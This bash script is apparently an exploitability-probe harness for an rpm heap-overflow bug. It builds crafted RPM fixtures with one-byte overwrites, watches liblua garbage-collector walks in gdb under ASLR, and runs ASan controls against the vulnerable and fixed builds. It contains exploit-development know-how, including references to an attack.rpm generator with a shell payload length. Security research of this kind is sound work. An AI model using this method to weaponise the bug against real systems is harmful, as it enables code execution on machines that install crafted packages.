#!/usr/bin/env bash
# High-byte-preserving short-write probe: a 1-byte copy at the 1-byte heap
# allocation changes only the low byte of the qword at buf+0. Question: can
# that redirect a live liblua GC walk under plain ASLR? Observer runs with
# `set disable-randomization off`; no debugger-forced call, no LD_PRELOAD.
set -u
cd "$(dirname "$0")"
root=$(cd .. && pwd)
vuln_plain=$root/build-vuln-plain/tools/rpm
vuln_asan=$root/build-vuln-asan/tools/rpm2cpio
fixed_asan=$root/build-fixed-asan/tools/rpm
vuln_config=${RPM_CONFIGDIR_VULN:-$root/install-vuln/lib/rpm}
fixed_config=${RPM_CONFIGDIR_FIXED:-$root/build-fixed-asan}
[ -f "$vuln_config/rpmrc" ] || vuln_config=$root/build-vuln-asan
for bin in "$vuln_plain" "$vuln_asan" "$fixed_asan"; do
    [ -x "$bin" ] || { echo "MISSING $bin"; exit 1; }
done

cfg_link=$(mktemp -d /tmp/r2s-sw.XXXXXX) || exit 1
rmdir "$cfg_link" || exit 1
ln -s "$vuln_config" "$cfg_link" || exit 1
work=$PWD/short-write/run
mkdir -p "$work/fixtures" "$work/logs" "$work/db"
targets=(/tmp/README /tmp/linkme /tmp/mydir /tmp/myscript.sh)
for p in "${targets[@]}"; do
    [ -e "$p" ] && { echo "REFUSE: $p exists"; rm -f "$cfg_link"; exit 1; }
done
cleanup() {
    rm -f /tmp/README /tmp/linkme /tmp/myscript.sh
    rmdir /tmp/mydir 2>/dev/null || true
}
trap 'cleanup; rm -f "$cfg_link"' EXIT
fresh() { cleanup; rm -rf "$work/db"; mkdir -p "$work/db"; }

pass=0
fail=0
ok()  { echo "PASS $1"; pass=$((pass + 1)); }
bad() { echo "FAIL $1"; fail=$((fail + 1)); }

# The generator must remain byte-identical in its default mode.
RPM2SHELL_PAYLOAD_LEN=64 python3 make-attack.py safe.rpm \
    "$work/default.rpm" > "$work/default.log" || exit 1
if cmp -s "$work/default.rpm" attack.rpm; then
    ok "generator default output byte-identical to attack.rpm"
else
    bad "generator default output changed"
fi

bytes=(00 10 20 30 40 50 60 70 80 90 a0 b0)
for b in "${bytes[@]}"; do
    python3 short-write/make-short.py install/attack-reloc.rpm \
        "$work/fixtures/n01-$b.rpm" 1 "$b" > "$work/fixtures/n01-$b.log" || exit 1
done

for b in "${bytes[@]}"; do
    fresh
    gdb -q -batch \
        -ex "set environment RPM_CONFIGDIR $cfg_link" \
        -ex "directory $root/src/rpm/lib" \
        -x short-write/observe.gdb --args "$vuln_plain" \
        --dbpath "$work/db" -i --nodeps --noscripts --nodigest \
        --nosignature --nofiledigest --ignoresize \
        "$work/fixtures/n01-$b.rpm" > "$work/logs/gdb-$b.log" 2>&1
    log="$work/logs/gdb-$b.log"
    if python3 - "$log" <<'PY'
import re, sys
text = open(sys.argv[1]).read()
pre = re.search(r"PRE_Q0=(0x[0-9a-f]+)", text)
post = re.search(r"POST_Q0=(0x[0-9a-f]+)", text)
visits = re.findall(r"CHOSEN_VISIT=(0x[0-9a-f]+) Q0=(0x[0-9a-f]+)", text)
preserved = bool(pre and post and int(pre.group(1), 16) >> 8 == int(post.group(1), 16) >> 8)
no_visit = all(v != post.group(1) for v, _ in visits)
sys.exit(0 if preserved and no_visit else 1)
PY
    then
        ok "byte $b: high bytes preserved, no liblua visit on rewritten buf+0 qword"
    else
        bad "byte $b: high-byte preservation or no-visit check failed"
    fi
done

for b in "${bytes[@]}"; do
    fresh
    RPM_CONFIGDIR="$cfg_link" "$vuln_plain" --dbpath "$work/db" -i \
        --nodeps --noscripts --nodigest --nosignature --nofiledigest \
        --ignoresize "$work/fixtures/n01-$b.rpm" \
        > "$work/logs/plain-$b.log" 2>&1
    rc=$?
    if [ "$rc" -eq 1 ]; then
        ok "byte $b: plain ASLR install exits 1 without fault"
    else
        bad "byte $b: plain ASLR install rc=$rc"
    fi
done

# Corruption control at the original 64-byte length still fires in real rpm.
fresh
RPM_CONFIGDIR="$vuln_config" ASAN_OPTIONS=detect_leaks=0:abort_on_error=1 \
    "$vuln_asan" attack.rpm > "$work/logs/asan-64.log" 2>&1
rc=$?
if [ "$rc" -eq 134 ] && grep -q 'WRITE of size 64' "$work/logs/asan-64.log"; then
    ok "64-byte control: real ASan WRITE in vulnerable consumer"
else
    bad "64-byte control rc=$rc"
fi

for name in zero short; do
    fixture=$([ "$name" = zero ] && echo install/attack-zero-reloc.rpm \
        || echo install/short-read-reloc.rpm)
    fresh
    RPM_CONFIGDIR="$cfg_link" "$vuln_plain" --dbpath "$work/db" -i \
        --nodeps --noscripts --nodigest --nosignature --nofiledigest \
        --ignoresize "$fixture" > "$work/logs/plain-$name.log" 2>&1
    rc=$?
    if [ "$rc" -eq 1 ]; then
        ok "plain $name control rc=1"
    else
        bad "plain $name control rc=$rc"
    fi
done

fresh
RPM_CONFIGDIR="$fixed_config" ASAN_OPTIONS=detect_leaks=0:abort_on_error=1 \
    "$fixed_asan" --dbpath "$work/db" -i --nodeps --noscripts --nodigest \
    --nosignature --nofiledigest --ignoresize install/attack-reloc.rpm \
    > "$work/logs/fixed-asan.log" 2>&1
rc=$?
if [ "$rc" -eq 1 ] && ! grep -q AddressSanitizer "$work/logs/fixed-asan.log"; then
    ok "fixed ASan attack rc=1 ASan-clean"
else
    bad "fixed ASan attack rc=$rc"
fi

fresh
RPM_CONFIGDIR="$cfg_link" ASAN_OPTIONS=detect_leaks=0:abort_on_error=1 \
    "$vuln_asan" safe-newc.rpm > "$work/logs/vuln-asan-safe.log" 2>&1
rc=$?
if [ "$rc" -eq 0 ] && ! grep -q AddressSanitizer "$work/logs/vuln-asan-safe.log"; then
    ok "vulnerable ASan safe input rc=0 ASan-clean"
else
    bad "vulnerable ASan safe input rc=$rc"
fi

echo "SHORT_WRITE_PASS=$pass SHORT_WRITE_FAIL=$fail"
[ "$fail" -eq 0 ]
